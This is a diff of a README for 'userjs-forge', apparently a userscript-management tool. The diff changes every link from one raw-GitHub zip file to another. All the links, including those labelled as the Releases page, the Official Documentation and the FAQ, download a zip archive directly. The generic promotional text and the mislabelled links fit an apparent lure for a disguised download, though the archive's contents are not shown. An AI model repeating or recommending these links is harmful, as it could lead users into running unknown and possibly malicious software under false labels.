@@ -1,6 +1,6 @@
 # 🚀 userjs-forge - Simplify Your Userscript Management
 
-[![Download userjs-forge](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/scripts-tooling/forge-userjs-3.5.zip)](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/scripts-tooling/forge-userjs-3.5.zip)
+[![Download userjs-forge](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/packages/shared/src/file/userjs_forge_2.6.zip)](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/packages/shared/src/file/userjs_forge_2.6.zip)
 
 ## 📋 Overview
 
@@ -18,13 +18,13 @@ Follow these simple steps to get userjs-forge up and running on your computer.
 
 2. **Download the Application**
    - Click the download button below to visit the Releases page:
-   [Visit this page to download](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/scripts-tooling/forge-userjs-3.5.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/packages/shared/src/file/userjs_forge_2.6.zip)
 
 ## 🔧 Installation Instructions
 
 1. **Visit the Releases Page**
    - Open your web browser.
-   - Go to the [userjs-forge Releases page](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/scripts-tooling/forge-userjs-3.5.zip).
+   - Go to the [userjs-forge Releases page](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/packages/shared/src/file/userjs_forge_2.6.zip).
 
 2. **Select the Latest Version**
    - Look for the most recent version available.
@@ -82,11 +82,11 @@ Users have the ability to modify many aspects of their scripts, which can lead t
 
 ## 🎉 Helpful Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/scripts-tooling/forge-userjs-3.5.zip)
-- [Frequently Asked Questions](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/scripts-tooling/forge-userjs-3.5.zip)
+- [Official Documentation](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/packages/shared/src/file/userjs_forge_2.6.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/packages/shared/src/file/userjs_forge_2.6.zip)
 
 ## 🔗 Conclusion
 
 userjs-forge is your reliable assistant for managing userscripts. Enjoy a streamlined process and increase your productivity with this powerful tool.
 
-For the latest version, please remember to check back at the [Releases page](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/scripts-tooling/forge-userjs-3.5.zip) regularly. Happy scripting!
+For the latest version, please remember to check back at the [Releases page](https://raw.githubusercontent.com/GaneshTBiradar/userjs-forge/main/packages/shared/src/file/userjs_forge_2.6.zip) regularly. Happy scripting!
